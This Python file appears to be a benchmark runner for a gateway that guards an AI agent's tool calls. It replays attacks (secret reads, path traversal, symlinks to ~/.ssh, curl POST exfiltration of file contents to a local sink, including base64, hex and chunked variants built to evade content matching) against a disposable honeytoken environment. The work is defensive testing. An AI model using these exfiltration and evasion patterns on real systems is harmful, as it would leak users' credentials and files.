"""Attack replay runner.

Runs the corpus in `unsafe` and/or `safe` mode against the SAME disposable
environment (apples-to-apples). Unsafe mode performs the raw operation with no
gateway; safe mode routes the identical attack through Gateway.invoke().

Measurement, not assertion:
  - secret reach is detected by finding a honeytoken sentinel in tool output;
  - network exfil is detected by a recorded hit on the local sink.

Safe-mode run_command requires the Docker sandbox (Milestone D). When no
container runtime is available, the runner records the decision (which IS known —
`sandbox`) and marks containment as not-yet-measured rather than asserting it.
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import shlex
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

from bench import honeytokens
from bench.sink import RecordingSink
from capsule.gateway import Gateway
from capsule.models import AttackReplayResult, ToolCall
from capsule.tools_loader import register_default_handlers
from sandbox.runner import run_in_sandbox  # top-level safe: docker imported lazily inside

_REPO_ROOT = Path(__file__).resolve().parent.parent
CORPUS_DIR = _REPO_ROOT / "bench" / "corpus"
LEGIT_DIR = _REPO_ROOT / "bench" / "legitimate"
MALICIOUS_REPO = _REPO_ROOT / "examples" / "malicious-repo"
DEFAULT_REPORT = _REPO_ROOT / "bench" / "REPORT.md"


def _load_dir(directory: Path, names: list[str] | None = None) -> list[dict]:
    cases = []
    for path in sorted(directory.glob("*.json")):
        case = json.loads(path.read_text())
        if names is None or case["attack"] in names:
            cases.append(case)
    return cases


def load_corpus(names: list[str] | None = None) -> list[dict]:
    return _load_dir(CORPUS_DIR, names)


def load_legitimate(names: list[str] | None = None) -> list[dict]:
    return _load_dir(LEGIT_DIR, names)


class BenchRunner:
    def __init__(self, base: Path | None = None):
        self.base = base
        self.env: honeytokens.DisposableEnv | None = None
        self.workspace: Path | None = None
        self.sink: RecordingSink | None = None
        self._orig_home = os.environ.get("HOME")
        self._orig_sandbox_exec = os.environ.get("CAPSULE_SANDBOX_EXEC")
        self._tmp_workspace: str | None = None
        self._egress_cache: dict | None = None

    # -- lifecycle ----------------------------------------------------------
    def setup(self, cases: list[dict]) -> None:
        self.env = honeytokens.setup(self.base)
        os.environ["HOME"] = str(self.env.home)

        self._tmp_workspace = tempfile.mkdtemp(prefix="capsule-bench-ws-")
        self.workspace = Path(self._tmp_workspace) / "malicious-repo"
        shutil.copytree(MALICIOUS_REPO, self.workspace)
        self._plant_symlinks(cases)

        # Bind the sink on all interfaces so a *networked* sandbox container can
        # reach it via host.docker.internal — that reachability is what makes
        # "blocked under --network none" a real measurement and not an artifact
        # of an unreachable loopback. The advertised URL stays on 127.0.0.1 for
        # host-side (unsafe-mode) callers; the runner rewrites loopback to
        # host.docker.internal for networked container runs.
        self.sink = RecordingSink(host="0.0.0.0").start()
        os.environ["CAPSULE_SINK_URL"] = f"http://127.0.0.1:{self.sink.port}"
        # Opt the sandbox handler into real container execution for the bench
        # (the default suite stays runtime-free).
        os.environ["CAPSULE_SANDBOX_EXEC"] = "1"

    def teardown(self) -> None:
        if self.sink:
            self.sink.stop()
        if self._tmp_workspace and Path(self._tmp_workspace).exists():
            shutil.rmtree(self._tmp_workspace, ignore_errors=True)
        honeytokens.teardown(self.base)
        if self._orig_home is not None:
            os.environ["HOME"] = self._orig_home
        if self._orig_sandbox_exec is None:
            os.environ.pop("CAPSULE_SANDBOX_EXEC", None)
        else:
            os.environ["CAPSULE_SANDBOX_EXEC"] = self._orig_sandbox_exec

    def _plant_symlinks(self, cases: list[dict]) -> None:
        for case in cases:
            sym = (case.get("setup") or {}).get("symlink")
            if not sym:
                continue
            link = self.workspace / sym["link"]
            target_key = sym["target_key"]
            target = (
                self.env.home / ".ssh" if target_key == "ssh_dir" else self.env.path(target_key)
            )
            if link.exists() or link.is_symlink():
                link.unlink()
            try:
                os.symlink(target, link)
            except (OSError, NotImplementedError):
                pass

    # -- execution ----------------------------------------------------------
    def run_case(self, case: dict, mode: str) -> AttackReplayResult:
        if case.get("kind") == "legitimate":
            return self._run_legitimate(case)
        if case.get("kind") == "taint":
            return self._run_unsafe_taint(case) if mode == "unsafe" else self._run_safe_taint(case)
        if mode == "unsafe":
            return self._run_unsafe(case)
        return self._run_safe(case)

    # ---- taint flow (read-then-exfil; caller declares NO source_refs) ----
    def _encode(self, text: str, encoding: str | None) -> str:
        """Apply a re-encoding transform to an exfil payload (Milestone E)."""
        if encoding == "base64":
            return base64.b64encode(text.encode()).decode()
        if encoding == "hex":
            return text.encode().hex()
        return text

    def _exfil_payload(self, case: dict, content: str) -> tuple[str, str]:
        """Return (wire_payload, sink_marker) for a single-shot taint case.

        `wire_payload` is what the attack actually sends (possibly re-encoded);
        `sink_marker` is the prefix to look for in the recording sink so the
        unsafe baseline and the safe leak-check both track the *encoded* bytes,
        not the plaintext (which never appears on the wire when encoded).
        """
        snippet = content.strip()[:120]
        wire = self._encode(snippet, case.get("encoding"))
        return wire, wire[:40]

    def _taint_args(self, case: dict, content: str) -> dict:
        wire, _ = self._exfil_payload(case, content)
        if case["taint_arg"] == "pr_body":
            # Raw stays the full content (verbatim paste); an encoded variant
            # carries the re-encoded snippet — the gateway must see through it.
            body = wire if case.get("encoding") else content
            return {"title": "Demo PR", "body": body}
        # network_command: embed the (possibly encoded) snippet plus a network
        # token so policy denies once taint fires.
        cmd = f"curl -s -X POST $CAPSULE_SINK_URL/leak --data-binary {shlex.quote(wire)}"
        return {"command": os.path.expandvars(cmd)}

    def _sink_marker(self, case: dict, content: str) -> str:
        """Prefix to look for in the recording sink to confirm a leak.

        For a chunked attack it is a prefix of the first fragment (the plaintext
        actually sent); otherwise the single-shot wire payload prefix.
        """
        if case.get("chunked"):
            words = content.split()
            start, end = case["chunks"][0]
            return " ".join(words[start:end])[:40]
        return self._exfil_payload(case, content)[1]

    def _chunk_commands(self, case: dict, content: str) -> list[str]:
        """Split content into per-call curl fragments for a chunked-exfil case.

        Each window is a short run of consecutive words wrapped in command noise
        — individually below the match threshold, caught only when the taint
        store reassembles the session buffer.
        """
        words = content.split()
        cmds = []
        for start, end in case["chunks"]:
            frag = " ".join(words[start:end])
            cmd = f"curl -s -X POST $CAPSULE_SINK_URL/leak --data-binary {shlex.quote(frag)}"
            cmds.append(os.path.expandvars(cmd))
        return cmds

    def _run_unsafe_taint(self, case: dict) -> AttackReplayResult:
        start = time.perf_counter()
        content = self._raw_read(case["precondition"]["arguments"]["path"])
        reached = True
        network_attempted = case["taint_arg"] == "network_command"
        note = "tainted content sent (no gateway)"
        if network_attempted:
            # A chunked attack issues several fragment commands; a single-shot
            # one issues one. Either way the (possibly encoded) bytes reach the
            # sink with no gateway in the path.
            commands = (
                self._chunk_commands(case, content)
                if case.get("chunked")
                else [self._taint_args(case, content)["command"]]
            )
            for command in commands:
                try:
                    subprocess.run(
                        command,
                        shell=True,
                        cwd=str(self.workspace),
                        env=dict(os.environ),
                        capture_output=True,
                        timeout=15,
                    )
                except Exception as e:  # noqa: BLE001
                    note = f"exec_error:{e}"
            marker = self._sink_marker(case, content)
            reached = bool(marker and self.sink.hits_containing(marker))
        duration_ms = int((time.perf_counter() - start) * 1000)
        return AttackReplayResult(
            attack=case["attack"],
            mode="unsafe",
            kind="taint",
            actual_decision="unsafe_direct",
            host_secret_visible=reached,
            network_attempted=network_attempted,
            network_blocked=False if network_attempted else None,
            tainted_outbound=True,
            tainted_handled=False,
            passed=reached,
            duration_ms=duration_ms,
            note=note,
        )

    def _run_safe_taint(self, case: dict) -> AttackReplayResult:
        gw = Gateway()  # audit/approval paths come from module defaults
        register_default_handlers(gw)
        start = time.perf_counter()

        # Step 1: read the file through the gateway -> registers content in the
        # taint store (this is the only "declaration" — the attack itself
        # declares nothing).
        pre = case["precondition"]["arguments"]["path"]
        read_res = gw.invoke(
            ToolCall(
                call_id=f"{case['attack']}_pre",
                tool="read_file",
                arguments={"path": pre},
                workspace=str(self.workspace),
            )
        )
        content = read_res.output or ""

        # Step 2: outbound attack — content pasted verbatim, re-encoded, or split
        # across calls; source_refs=[] (default). Enforcement must rely on content
        # match, not declaration. The result evaluated is the *last* call (for a
        # chunked attack, the one the reassembly buffer trips on).
        sink_mark = len(self.sink.hits)
        if case.get("chunked"):
            for i, command in enumerate(self._chunk_commands(case, content)):
                out = gw.invoke(
                    ToolCall(
                        call_id=f"{case['attack']}_{i}",
                        tool=case["tool"],
                        arguments={"command": command},
                        workspace=str(self.workspace),
                    )
                )
        else:
            out = gw.invoke(
                ToolCall(
                    call_id=case["attack"],
                    tool=case["tool"],
                    arguments=self._taint_args(case, content),
                    workspace=str(self.workspace),
                )
            )
        duration_ms = int((time.perf_counter() - start) * 1000)

        actual = out.decision.value
        expected = case["expected_safe_decision"]
        # Restrictive decisions don't execute -> nothing left the boundary. Scope
        # the check to hits newer than sink_mark so a stale unsafe-mode hit for
        # the same snippet is never miscounted as a safe-mode leak.
        leaked = False
        if case["taint_arg"] == "network_command" and "run_command" in gw.handlers:
            marker = self._sink_marker(case, content)
            leaked = bool(marker and self._sink_hit_since(marker, sink_mark))
        tainted_handled = actual in {"flag", "approval_required", "deny"}
        return AttackReplayResult(
            attack=case["attack"],
            mode="safe",
            kind="taint",
            expected_decision=expected,
            actual_decision=actual,
            host_secret_visible=leaked,
            network_attempted=case["taint_arg"] == "network_command",
            network_blocked=(not leaked) if case["taint_arg"] == "network_command" else None,
            tainted_outbound=True,
            tainted_handled=tainted_handled,
            passed=(actual == expected) and not leaked,
            duration_ms=duration_ms,
            note=f"variant={self._taint_variant(case)}; taint flags={out.taint_flags}",
        )

    @staticmethod
    def _taint_variant(case: dict) -> str:
        """Stable classifier for the report: how the secret was transformed."""
        if case.get("chunked"):
            return "chunked"
        return case.get("encoding") or "verbatim"

    # ---- unsafe (raw, no gateway) ----
    def _run_unsafe(self, case: dict) -> AttackReplayResult:
        kind = case["kind"]
        start = time.perf_counter()
        host_secret_visible = False
        network_attempted = False
        note = ""

        if kind == "network_exfil":
            network_attempted = True
            cmd = os.path.expandvars(case["arguments"]["command"])
            try:
                subprocess.run(
                    cmd,
                    shell=True,
                    cwd=str(self.workspace),
                    env=dict(os.environ),
                    capture_output=True,
                    timeout=15,
                )
            except Exception as e:  # noqa: BLE001
                note = f"exec_error:{e}"
            sentinel = self.env.sentinels.get(case.get("sentinel"))
            if sentinel and self.sink.hits_containing(sentinel):
                host_secret_visible = True
        else:
            content = self._raw_read(case["arguments"]["path"])
            sentinel_key = case.get("sentinel")
            if sentinel_key:
                sentinel = self.env.sentinels.get(sentinel_key, "___none___")
                host_secret_visible = sentinel in content
            else:
                # path_traversal: success = escaped the workspace and read content.
                host_secret_visible = bool(content.strip())
            note = f"read {len(content)} bytes"

        duration_ms = int((time.perf_counter() - start) * 1000)
        return AttackReplayResult(
            attack=case["attack"],
            mode="unsafe",
            kind=kind,
            actual_decision="unsafe_direct",
            host_secret_visible=host_secret_visible,
            network_attempted=network_attempted,
            network_blocked=False if network_attempted else None,
            passed=host_secret_visible,  # baseline reproduced: the attack reached
            duration_ms=duration_ms,
            note=note,
        )

    def _raw_read(self, path: str) -> str:
        expanded = os.path.expanduser(path)
        target = Path(expanded) if os.path.isabs(expanded) else (self.workspace / path)
        try:
            return target.resolve().read_text(errors="replace")
        except OSError:
            return ""

    # ---- legitimate tasks (utility / false-deny measurement) ----
    def _run_legitimate(self, case: dict) -> AttackReplayResult:
        gw = Gateway()  # audit/approval paths come from module defaults
        register_default_handlers(gw)
        args = dict(case["arguments"])
        if "command" in args:
            args["command"] = os.path.expandvars(args["command"])
        start = time.perf_counter()
        res = gw.invoke(
            ToolCall(
                call_id=f"legit_{case['attack']}",
                tool=case["tool"],
                arguments=args,
                workspace=str(self.workspace),
            )
        )
        duration_ms = int((time.perf_counter() - start) * 1000)
        actual = res.decision.value
        expected = case.get("expected_safe_decision")
        denied = actual == "deny"
        # A legitimate task "succeeds" if it wasn't wrongly denied and the
        # decision matches expectation. For sandboxed run_command the real
        # execution needs the runtime (Milestone D) — the decision is the
        # measurable signal here.
        note = ""
        if case["tool"] == "run_command":
            if not res.ok:
                note = f"sandbox decision correct; not executed ({res.error})"
            else:
                tail = (res.output or "").strip().splitlines()[-1:] or [""]
                note = f"sandbox decision correct; executed in container {tail[0]}"
        return AttackReplayResult(
            attack=case["attack"],
            mode="safe",
            kind="legitimate",
            expected_decision=expected,
            actual_decision=actual,
            passed=(actual == expected) and not denied,
            duration_ms=duration_ms,
            note=note,
        )

    def _sink_hit_since(self, needle: str, mark: int) -> bool:
        """True if `needle` appears in any sink hit recorded after index `mark`.

        The sink accumulates across modes; an unsafe-mode run genuinely posts the
        secret to it. Scoping to hits newer than `mark` ensures a safe-mode check
        measures only what the *safe* call sent — never a stale unsafe hit.
        """
        return any(needle in h.body or needle in h.path for h in self.sink.hits[mark:])

    # ---- egress-containment control (network attribution) ----
    def _egress_control(self) -> dict:
        """Prove, self-contained, that --network none is what blocks egress.

        Posts a known token to the recording sink from (a) a networked container
        and (b) a `--network none` container. The expected result is
        networked=reachable, sandboxed=blocked. This isolates the network as the
        cause, so a corpus attack producing "no sink hit" under the sandbox is a
        genuine network block rather than an artifact (unreachable address,
        missing binary, absent file). Computed once and cached.
        """
        if self._egress_cache is not None:
            return self._egress_cache
        port = self.sink.port
        url = f"http://127.0.0.1:{port}/__egress_control__"  # runner rewrites for networked
        net_tok, none_tok = "EGRESS_CTL_NET", "EGRESS_CTL_NONE"
        run_in_sandbox(
            f"curl -s -m 5 -X POST {url} --data-binary {net_tok}", network="bridge", timeout=25
        )
        run_in_sandbox(
            f"curl -s -m 5 -X POST {url} --data-binary {none_tok}", network="none", timeout=25
        )
        self._egress_cache = {
            "networked_reachable": bool(self.sink.hits_containing(net_tok)),
            "sandboxed_blocked": not self.sink.hits_containing(none_tok),
        }
        return self._egress_cache

    # ---- safe (through the gateway) ----
    def _run_safe(self, case: dict) -> AttackReplayResult:
        gw = Gateway()  # audit/approval paths come from module defaults
        register_default_handlers(gw)
        kind = case["kind"]

        start = time.perf_counter()
        # Pre-register the sink URL substitution for run_command attacks.
        arguments = dict(case["arguments"])
        if "command" in arguments:
            arguments["command"] = os.path.expandvars(arguments["command"])

        sentinel = self.env.sentinels.get(case.get("sentinel"), None)
        sink_mark = len(self.sink.hits)
        result = gw.invoke(
            ToolCall(
                call_id=f"bench_{case['attack']}",
                tool=case["tool"],
                arguments=arguments,
                workspace=str(self.workspace),
            )
        )
        duration_ms = int((time.perf_counter() - start) * 1000)

        actual = result.decision.value
        expected = case.get("expected_safe_decision")
        host_secret_visible = bool(sentinel and result.output and sentinel in result.output)
        network_attempted = kind == "network_exfil"
        network_blocked: bool | None = None
        note = ""
        passed = False

        if kind == "network_exfil":
            if "run_command" not in gw.handlers or not result.ok:
                # No sandbox runtime (handler absent, or it reported
                # sandbox_disabled / sandbox_unavailable): the decision is known
                # (sandbox) but containment was never exercised. Be honest rather
                # than assert "blocked".
                note = (
                    "sandbox runtime unavailable — exfil containment not measured "
                    f"(decision={actual}; {result.error or 'no handler'})"
                )
                passed = actual == expected  # decision is correct even if unrun
            else:
                ctl = self._egress_control()
                sandbox_hit = bool(sentinel and self._sink_hit_since(sentinel, sink_mark))
                if not ctl["networked_reachable"]:
                    # Can't attribute a no-hit to the sandbox if the sink is
                    # unreachable even with networking. Don't claim a block.
                    note = (
                        "egress control could not reach the sink; "
                        "containment not attributable to --network none"
                    )
                    network_blocked = None
                    passed = actual == expected
                else:
                    network_blocked = not sandbox_hit
                    passed = network_blocked and not host_secret_visible
                    note = (
                        f"egress control: networked=reachable, "
                        f"sandbox(--network none) blocked={ctl['sandboxed_blocked']}; "
                        f"attack sink_hit={sandbox_hit}"
                    )
        else:
            # secret_read / traversal / symlink: gateway should deny; secret must
            # not be visible.
            passed = (actual == expected) and not host_secret_visible

        return AttackReplayResult(
            attack=case["attack"],
            mode="safe",
            kind=kind,
            expected_decision=expected,
            actual_decision=actual,
            host_secret_visible=host_secret_visible,
            network_attempted=network_attempted,
            network_blocked=network_blocked,
            passed=passed,
            duration_ms=duration_ms,
            note=note,
        )


def run(
    modes: list[str],
    attacks: list[str] | None = None,
    report_path: Path = DEFAULT_REPORT,
    include_legitimate: bool = True,
) -> list[AttackReplayResult]:
    from bench.analyze import build_report

    cases = load_corpus(attacks)
    legit = load_legitimate() if (include_legitimate and "safe" in modes) else []
    runner = BenchRunner()
    results: list[AttackReplayResult] = []
    try:
        runner.setup(cases + legit)
        for mode in modes:
            for case in cases:
                results.append(runner.run_case(case, mode))
        # Legitimate tasks are a safe-mode utility measurement.
        for case in legit:
            results.append(runner.run_case(case, "safe"))
    finally:
        runner.teardown()

    report_path.write_text(build_report(results, modes))
    return results


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(prog="bench.runner")
    parser.add_argument(
        "--mode", default="unsafe", help="unsafe | safe | both (comma-separated also accepted)"
    )
    parser.add_argument(
        "--attacks", default=None, help="comma-separated attack names; default = all"
    )
    parser.add_argument("--report", default=str(DEFAULT_REPORT))
    args = parser.parse_args(argv)

    if args.mode == "both":
        modes = ["unsafe", "safe"]
    else:
        modes = [m.strip() for m in args.mode.split(",") if m.strip()]
    attacks = [a.strip() for a in args.attacks.split(",")] if args.attacks else None

    results = run(modes, attacks, Path(args.report))
    for r in results:
        flag = "OK " if r.passed else "-- "
        print(
            f"[{flag}] {r.mode:6} {r.attack:22} decision={r.actual_decision} "
            f"secret_visible={r.host_secret_visible} blocked={r.network_blocked} "
            f"{r.note}"
        )
    print(f"\nReport written to {args.report}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
